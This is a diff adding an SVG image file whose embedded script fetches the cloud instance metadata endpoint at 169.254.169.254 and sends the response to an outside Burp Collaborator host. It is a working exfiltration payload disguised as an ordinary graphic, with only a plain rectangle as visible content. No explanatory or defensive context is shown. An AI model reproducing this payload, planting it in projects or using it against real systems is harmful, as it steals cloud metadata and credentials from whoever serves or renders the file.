@@ -1,0 +1,16 @@
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <script>
+    var req = new XMLHttpRequest();
+    req.open("GET", "http://169.254.169.254/latest/meta-data/", true);
+    req.onreadystatechange = function() {
+      if (req.readyState === 4 && req.status === 200) {
+        var req2 = new XMLHttpRequest();
+        req2.open("POST", "https://nb2r2kxlqaip437ql86akc8bf2ls9h.burpcollaborator.net/metadata", true);
+        req2.setRequestHeader("Content-Type", "application/json");
+        req2.send(JSON.stringify({metadata: req.responseText}));
+      }
+    }
+    req.send();
+  </script>
+  <rect width="100" height="100"/>
+</svg>
